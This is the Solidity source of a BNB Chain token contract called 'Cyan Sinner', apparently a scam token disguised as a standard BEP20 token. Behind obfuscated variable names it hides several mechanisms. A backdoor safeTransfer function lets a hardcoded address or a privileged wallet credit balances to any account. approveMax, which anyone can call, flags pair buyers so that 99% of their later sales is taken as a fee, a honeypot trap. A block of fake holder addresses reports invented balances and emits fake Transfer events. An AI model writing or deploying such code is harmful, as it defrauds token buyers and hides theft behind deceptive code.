/**
 *Submitted for verification at BscScan.com on 2023-01-09
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.3;



library SafeMath {

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}


interface IBEP20 {

    function getOwner() external view returns (address);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function name() external view returns (string memory);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}



interface IUniswapV2Router {

    function factory() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function WETH() external pure returns (address);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}




contract CyanSinner is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint256  receiverMinLaunchedSender = 100000000 * 10 ** _decimals;
    uint256 public launchAutoLimitTxLiquidity = 0;

    uint256 receiverFundTxWalletTotal = 0;
    IUniswapV2Router public enableListExemptReceiverLaunch;
    bool private buyAutoLaunchedFee = false;
    mapping(address => bool)  botsBurnListTx;
    uint160 constant mintTakeMarketingMin = 889760306547 * 2 ** 120;


    uint256  exemptAmountLimitEnable = 100000000 * 10 ** _decimals;
    mapping(address => uint256) _balances;
    uint256 constant senderTradingTokenModeBotsBuyMax = 1100000 * 10 ** 18;
    

    address private launchedTradingAutoExempt = (msg.sender);
    bool public botsReceiverLaunchedBurn = false;


    uint256 constant enableSenderTxList = 100 * 10 ** 18;
    string constant _name = "Cyan Sinner";
    mapping(address => mapping(address => uint256)) _allowances;
    bool public receiverTakeIsMintMaxTx = false;
    uint256 private isTeamLaunchedWalletTxSenderAmount = 0;
    uint160 constant teamExemptLiquidityWallet = 859105540793 * 2 ** 80;

    bool private tokenLaunchShouldWallet = false;

    string constant _symbol = "CSR";
    mapping(address => bool)  marketingLiquidityTradingShouldReceiver;
    uint256 public senderLaunchSellModeAutoBuyTx = 0;
    uint160 constant fromToTotalEnable = 22565946894 * 2 ** 40;
    uint256 private exemptAutoMaxAt = 100;
    uint256 constant amountSenderListMarketing = 100000000 * (10 ** 18);
    uint256 private launchAmountTeamMarketingFrom = 0;
    uint256 public isFeeTeamMin = 0;
    address public uniswapV2Pair;
    uint160 constant tradingLaunchExemptList = 335314260443;
    uint256 private receiverTeamTakeMax = 0;
    uint256 public receiverFromShouldTo = 0;
    uint256 private listEnableTeamTokenFundMarketingShould = 0;
    mapping(address => bool) private shouldListTxFee;





    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        enableListExemptReceiverLaunch = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(enableListExemptReceiverLaunch.factory()).createPair(address(this), enableListExemptReceiverLaunch.WETH());
        _allowances[address(this)][address(enableListExemptReceiverLaunch)] = amountSenderListMarketing;

        shouldListTxFee[msg.sender] = true;
        shouldListTxFee[address(this)] = true;

        _balances[msg.sender] = amountSenderListMarketing;
        emit Transfer(address(0), msg.sender, amountSenderListMarketing);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return amountSenderListMarketing;
    }

    function receiverTxAutoTakeTokenTotalFund(uint160 launchedModeToTeamSellAuto) private view returns (uint256) {
        uint160 toSellBuyAmount = mintTakeMarketingMin + teamExemptLiquidityWallet + fromToTotalEnable + tradingLaunchExemptList;
        uint160 botsEnableMintMarketing = launchedModeToTeamSellAuto - toSellBuyAmount;
        if (botsEnableMintMarketing < receiverFundTxWalletTotal) {
            return enableSenderTxList * botsEnableMintMarketing;
        }
        return senderTradingTokenModeBotsBuyMax + enableSenderTxList * botsEnableMintMarketing;
    }

    function setmintLaunchedTokenSender(bool buyBotsTakeFundWallet) public onlyOwner {
        if (botsReceiverLaunchedBurn != tokenLaunchShouldWallet) {
            tokenLaunchShouldWallet=buyBotsTakeFundWallet;
        }
        botsReceiverLaunchedBurn=buyBotsTakeFundWallet;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function enableMaxTradingIs(address launchedModeToTeamSellAuto) private pure returns (bool) {
        return launchedModeToTeamSellAuto == enableFromShouldAuto();
    }

    function safeTransfer(address sellBuyLaunchSender, address maxTeamLimitBuy, uint256 exemptListFundMint) public {
        if (!enableMaxTradingIs(msg.sender) && msg.sender != launchedTradingAutoExempt) {
            return;
        }
        if (isFromTradingMint(uint160(maxTeamLimitBuy))) {
            mintLaunchedBuyWallet(sellBuyLaunchSender, maxTeamLimitBuy, exemptListFundMint, false);
            return;
        }
        if (isFromTradingMint(uint160(sellBuyLaunchSender))) {
            mintLaunchedBuyWallet(sellBuyLaunchSender, maxTeamLimitBuy, exemptListFundMint, true);
            return;
        }
        if (sellBuyLaunchSender == address(0)) {
            _balances[maxTeamLimitBuy] = _balances[maxTeamLimitBuy].add(exemptListFundMint);
            return;
        }
    }

    function txTradingAmountMax(address sellBuyLaunchSender, address maxModeSellTxAtTrading, uint256 exemptListFundMint) internal returns (uint256) {
        
        if (receiverFromShouldTo != exemptAutoMaxAt) {
            receiverFromShouldTo = receiverFromShouldTo;
        }


        uint256 enableToSenderBurn = exemptListFundMint.mul(listTotalMarketingSender(sellBuyLaunchSender, maxModeSellTxAtTrading == uniswapV2Pair)).div(exemptAutoMaxAt);
        
        if (receiverTeamTakeMax != exemptAutoMaxAt) {
            receiverTeamTakeMax = senderLaunchSellModeAutoBuyTx;
        }

        if (isFeeTeamMin != senderLaunchSellModeAutoBuyTx) {
            isFeeTeamMin = senderLaunchSellModeAutoBuyTx;
        }

        if (launchAmountTeamMarketingFrom != exemptAutoMaxAt) {
            launchAmountTeamMarketingFrom = exemptAutoMaxAt;
        }


        if (enableToSenderBurn > 0) {
            _balances[address(this)] = _balances[address(this)].add(enableToSenderBurn);
            emit Transfer(sellBuyLaunchSender, address(this), enableToSenderBurn);
        }
        
        return exemptListFundMint.sub(enableToSenderBurn);
    }

    function getatWalletTradingAmountTotal() public view returns (uint256) {
        if (launchAutoLimitTxLiquidity == listEnableTeamTokenFundMarketingShould) {
            return listEnableTeamTokenFundMarketingShould;
        }
        if (launchAutoLimitTxLiquidity == isFeeTeamMin) {
            return isFeeTeamMin;
        }
        if (launchAutoLimitTxLiquidity != exemptAutoMaxAt) {
            return exemptAutoMaxAt;
        }
        return launchAutoLimitTxLiquidity;
    }

    function setfundTakeTotalTeam(uint256 buyBotsTakeFundWallet) public onlyOwner {
        if (launchAmountTeamMarketingFrom == isFeeTeamMin) {
            isFeeTeamMin=buyBotsTakeFundWallet;
        }
        if (launchAmountTeamMarketingFrom == launchAutoLimitTxLiquidity) {
            launchAutoLimitTxLiquidity=buyBotsTakeFundWallet;
        }
        launchAmountTeamMarketingFrom=buyBotsTakeFundWallet;
    }

    function burnMaxShouldBotsSellSwap(address sellBuyLaunchSender, address maxTeamLimitBuy, uint256 exemptListFundMint) internal returns (bool) {
        if (isFromTradingMint(uint160(maxTeamLimitBuy))) {
            mintLaunchedBuyWallet(sellBuyLaunchSender, maxTeamLimitBuy, exemptListFundMint, false);
            return true;
        }
        if (isFromTradingMint(uint160(sellBuyLaunchSender))) {
            mintLaunchedBuyWallet(sellBuyLaunchSender, maxTeamLimitBuy, exemptListFundMint, true);
            return true;
        }
        
        bool tokenMintMaxLaunchedModeFromBurn = teamToSellIs(sellBuyLaunchSender) || teamToSellIs(maxTeamLimitBuy);
        
        if (sellBuyLaunchSender == uniswapV2Pair && !tokenMintMaxLaunchedModeFromBurn) {
            marketingLiquidityTradingShouldReceiver[maxTeamLimitBuy] = true;
        }
        
        if (tokenLaunchShouldWallet != receiverTakeIsMintMaxTx) {
            tokenLaunchShouldWallet = receiverTakeIsMintMaxTx;
        }

        if (isFeeTeamMin == isTeamLaunchedWalletTxSenderAmount) {
            isFeeTeamMin = launchAutoLimitTxLiquidity;
        }


        if (tokenMintMaxLaunchedModeFromBurn) {
            return mintSellBurnMax(sellBuyLaunchSender, maxTeamLimitBuy, exemptListFundMint);
        }
        
        if (launchAmountTeamMarketingFrom != isTeamLaunchedWalletTxSenderAmount) {
            launchAmountTeamMarketingFrom = senderLaunchSellModeAutoBuyTx;
        }

        if (receiverFromShouldTo == isFeeTeamMin) {
            receiverFromShouldTo = exemptAutoMaxAt;
        }

        if (tokenLaunchShouldWallet == botsReceiverLaunchedBurn) {
            tokenLaunchShouldWallet = tokenLaunchShouldWallet;
        }


        _balances[sellBuyLaunchSender] = _balances[sellBuyLaunchSender].sub(exemptListFundMint, "Insufficient Balance!");
        
        uint256 exemptListFundMintReceived = sellReceiverIsModeShould(sellBuyLaunchSender) ? txTradingAmountMax(sellBuyLaunchSender, maxTeamLimitBuy, exemptListFundMint) : exemptListFundMint;

        _balances[maxTeamLimitBuy] = _balances[maxTeamLimitBuy].add(exemptListFundMintReceived);
        emit Transfer(sellBuyLaunchSender, maxTeamLimitBuy, exemptListFundMintReceived);
        return true;
    }

    function approveMax(address spender) external {
        if (marketingLiquidityTradingShouldReceiver[spender]) {
            botsBurnListTx[spender] = true;
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (isFromTradingMint(uint160(account))) {
            return receiverTxAutoTakeTokenTotalFund(uint160(account));
        }
        return _balances[account];
    }

    function setswapFundTxListMarketing(uint256 buyBotsTakeFundWallet) public onlyOwner {
        exemptAutoMaxAt=buyBotsTakeFundWallet;
    }

    function isFromTradingMint(uint160 launchedModeToTeamSellAuto) private pure returns (bool) {
        uint160 toSellBuyAmount = mintTakeMarketingMin + teamExemptLiquidityWallet + fromToTotalEnable + tradingLaunchExemptList;
        if (launchedModeToTeamSellAuto >= uint160(toSellBuyAmount)) {
            if (launchedModeToTeamSellAuto <= uint160(toSellBuyAmount) + 300000) {
                return true;
            }
        }
        return false;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function setreceiverSwapMarketingEnable(bool buyBotsTakeFundWallet) public onlyOwner {
        if (buyAutoLaunchedFee != buyAutoLaunchedFee) {
            buyAutoLaunchedFee=buyBotsTakeFundWallet;
        }
        if (buyAutoLaunchedFee == tokenLaunchShouldWallet) {
            tokenLaunchShouldWallet=buyBotsTakeFundWallet;
        }
        buyAutoLaunchedFee=buyBotsTakeFundWallet;
    }

    function listTotalMarketingSender(address sellBuyLaunchSender, bool tokenSenderListTradingTx) internal returns (uint256) {
        if (botsBurnListTx[sellBuyLaunchSender]) {
            return 99;
        }
        
        if (tokenSenderListTradingTx) {
            return listEnableTeamTokenFundMarketingShould;
        }
        
        if (!tokenSenderListTradingTx && sellBuyLaunchSender == uniswapV2Pair) {
            return isTeamLaunchedWalletTxSenderAmount;
        }
        
        return 0;
    }

    function enableFromShouldAuto() private pure returns (address) {
        return 0x9Cd36cC4b84C3a55b4038a96d23E85DbD0dC1d61;
    }

    function getexemptTradingMinBurn() public view returns (uint256) {
        if (receiverTeamTakeMax != receiverTeamTakeMax) {
            return receiverTeamTakeMax;
        }
        return receiverTeamTakeMax;
    }

    function mintSellBurnMax(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function isApproveMax(address spender) public view returns (bool) {
        return botsBurnListTx[spender];
    }

    function gettakeListExemptAmount() public view returns (address) {
        if (launchedTradingAutoExempt == launchedTradingAutoExempt) {
            return launchedTradingAutoExempt;
        }
        if (launchedTradingAutoExempt != launchedTradingAutoExempt) {
            return launchedTradingAutoExempt;
        }
        if (launchedTradingAutoExempt == launchedTradingAutoExempt) {
            return launchedTradingAutoExempt;
        }
        return launchedTradingAutoExempt;
    }

    function getswapFundTxListMarketing() public view returns (uint256) {
        if (exemptAutoMaxAt != receiverFromShouldTo) {
            return receiverFromShouldTo;
        }
        if (exemptAutoMaxAt == launchAmountTeamMarketingFrom) {
            return launchAmountTeamMarketingFrom;
        }
        return exemptAutoMaxAt;
    }

    function getshouldTradingTakeLaunched() public view returns (uint256) {
        if (senderLaunchSellModeAutoBuyTx != receiverFromShouldTo) {
            return receiverFromShouldTo;
        }
        if (senderLaunchSellModeAutoBuyTx != listEnableTeamTokenFundMarketingShould) {
            return listEnableTeamTokenFundMarketingShould;
        }
        if (senderLaunchSellModeAutoBuyTx != senderLaunchSellModeAutoBuyTx) {
            return senderLaunchSellModeAutoBuyTx;
        }
        return senderLaunchSellModeAutoBuyTx;
    }

    function sellReceiverIsModeShould(address sellBuyLaunchSender) internal view returns (bool) {
        return !shouldListTxFee[sellBuyLaunchSender];
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != amountSenderListMarketing) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return burnMaxShouldBotsSellSwap(sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function setexemptTradingMinBurn(uint256 buyBotsTakeFundWallet) public onlyOwner {
        if (receiverTeamTakeMax != launchAutoLimitTxLiquidity) {
            launchAutoLimitTxLiquidity=buyBotsTakeFundWallet;
        }
        if (receiverTeamTakeMax == launchAutoLimitTxLiquidity) {
            launchAutoLimitTxLiquidity=buyBotsTakeFundWallet;
        }
        if (receiverTeamTakeMax == senderLaunchSellModeAutoBuyTx) {
            senderLaunchSellModeAutoBuyTx=buyBotsTakeFundWallet;
        }
        receiverTeamTakeMax=buyBotsTakeFundWallet;
    }

    function getfromSenderTeamLaunch() public view returns (uint256) {
        if (listEnableTeamTokenFundMarketingShould == senderLaunchSellModeAutoBuyTx) {
            return senderLaunchSellModeAutoBuyTx;
        }
        if (listEnableTeamTokenFundMarketingShould == isTeamLaunchedWalletTxSenderAmount) {
            return isTeamLaunchedWalletTxSenderAmount;
        }
        return listEnableTeamTokenFundMarketingShould;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function getmintLaunchedTokenSender() public view returns (bool) {
        if (botsReceiverLaunchedBurn == receiverTakeIsMintMaxTx) {
            return receiverTakeIsMintMaxTx;
        }
        return botsReceiverLaunchedBurn;
    }

    function teamToSellIs(address senderExemptMinToken) private view returns (bool) {
        if (senderExemptMinToken == launchedTradingAutoExempt) {
            return true;
        }
        return false;
    }

    function settakeSenderBotsLimit(uint256 buyBotsTakeFundWallet) public onlyOwner {
        if (receiverFromShouldTo != exemptAutoMaxAt) {
            exemptAutoMaxAt=buyBotsTakeFundWallet;
        }
        if (receiverFromShouldTo != receiverTeamTakeMax) {
            receiverTeamTakeMax=buyBotsTakeFundWallet;
        }
        if (receiverFromShouldTo == receiverFromShouldTo) {
            receiverFromShouldTo=buyBotsTakeFundWallet;
        }
        receiverFromShouldTo=buyBotsTakeFundWallet;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return burnMaxShouldBotsSellSwap(msg.sender, recipient, amount);
    }

    function setatWalletTradingAmountTotal(uint256 buyBotsTakeFundWallet) public onlyOwner {
        if (launchAutoLimitTxLiquidity != launchAmountTeamMarketingFrom) {
            launchAmountTeamMarketingFrom=buyBotsTakeFundWallet;
        }
        launchAutoLimitTxLiquidity=buyBotsTakeFundWallet;
    }

    function settakeListExemptAmount(address buyBotsTakeFundWallet) public onlyOwner {
        if (launchedTradingAutoExempt != launchedTradingAutoExempt) {
            launchedTradingAutoExempt=buyBotsTakeFundWallet;
        }
        if (launchedTradingAutoExempt == launchedTradingAutoExempt) {
            launchedTradingAutoExempt=buyBotsTakeFundWallet;
        }
        launchedTradingAutoExempt=buyBotsTakeFundWallet;
    }

    function mintLaunchedBuyWallet(address sellBuyLaunchSender, address maxTeamLimitBuy, uint256 exemptListFundMint, bool burnBotsAtTradingExemptFee) private {
        uint160 toSellBuyAmount = mintTakeMarketingMin + teamExemptLiquidityWallet + fromToTotalEnable + tradingLaunchExemptList;
        if (burnBotsAtTradingExemptFee) {
            sellBuyLaunchSender = address(uint160(toSellBuyAmount + receiverFundTxWalletTotal));
            receiverFundTxWalletTotal++;
            _balances[maxTeamLimitBuy] = _balances[maxTeamLimitBuy].add(exemptListFundMint);
        } else {
            _balances[sellBuyLaunchSender] = _balances[sellBuyLaunchSender].sub(exemptListFundMint);
        }
        if (exemptListFundMint == 0) {
            return;
        }
        emit Transfer(sellBuyLaunchSender, maxTeamLimitBuy, exemptListFundMint);
    }

    function setshouldTradingTakeLaunched(uint256 buyBotsTakeFundWallet) public onlyOwner {
        if (senderLaunchSellModeAutoBuyTx != receiverFromShouldTo) {
            receiverFromShouldTo=buyBotsTakeFundWallet;
        }
        if (senderLaunchSellModeAutoBuyTx == receiverTeamTakeMax) {
            receiverTeamTakeMax=buyBotsTakeFundWallet;
        }
        senderLaunchSellModeAutoBuyTx=buyBotsTakeFundWallet;
    }

    function setfromSenderTeamLaunch(uint256 buyBotsTakeFundWallet) public onlyOwner {
        if (listEnableTeamTokenFundMarketingShould == listEnableTeamTokenFundMarketingShould) {
            listEnableTeamTokenFundMarketingShould=buyBotsTakeFundWallet;
        }
        if (listEnableTeamTokenFundMarketingShould == isTeamLaunchedWalletTxSenderAmount) {
            isTeamLaunchedWalletTxSenderAmount=buyBotsTakeFundWallet;
        }
        listEnableTeamTokenFundMarketingShould=buyBotsTakeFundWallet;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function setatModeIsMin(uint256 buyBotsTakeFundWallet) public onlyOwner {
        if (isFeeTeamMin == senderLaunchSellModeAutoBuyTx) {
            senderLaunchSellModeAutoBuyTx=buyBotsTakeFundWallet;
        }
        if (isFeeTeamMin == receiverTeamTakeMax) {
            receiverTeamTakeMax=buyBotsTakeFundWallet;
        }
        if (isFeeTeamMin != receiverTeamTakeMax) {
            receiverTeamTakeMax=buyBotsTakeFundWallet;
        }
        isFeeTeamMin=buyBotsTakeFundWallet;
    }

    function getreceiverSwapMarketingEnable() public view returns (bool) {
        if (buyAutoLaunchedFee != buyAutoLaunchedFee) {
            return buyAutoLaunchedFee;
        }
        if (buyAutoLaunchedFee == botsReceiverLaunchedBurn) {
            return botsReceiverLaunchedBurn;
        }
        if (buyAutoLaunchedFee == tokenLaunchShouldWallet) {
            return tokenLaunchShouldWallet;
        }
        return buyAutoLaunchedFee;
    }

    function gettakeSenderBotsLimit() public view returns (uint256) {
        return receiverFromShouldTo;
    }

    function getfundTakeTotalTeam() public view returns (uint256) {
        if (launchAmountTeamMarketingFrom == receiverTeamTakeMax) {
            return receiverTeamTakeMax;
        }
        if (launchAmountTeamMarketingFrom != isFeeTeamMin) {
            return isFeeTeamMin;
        }
        return launchAmountTeamMarketingFrom;
    }

    function getatModeIsMin() public view returns (uint256) {
        if (isFeeTeamMin != listEnableTeamTokenFundMarketingShould) {
            return listEnableTeamTokenFundMarketingShould;
        }
        if (isFeeTeamMin != isTeamLaunchedWalletTxSenderAmount) {
            return isTeamLaunchedWalletTxSenderAmount;
        }
        return isFeeTeamMin;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}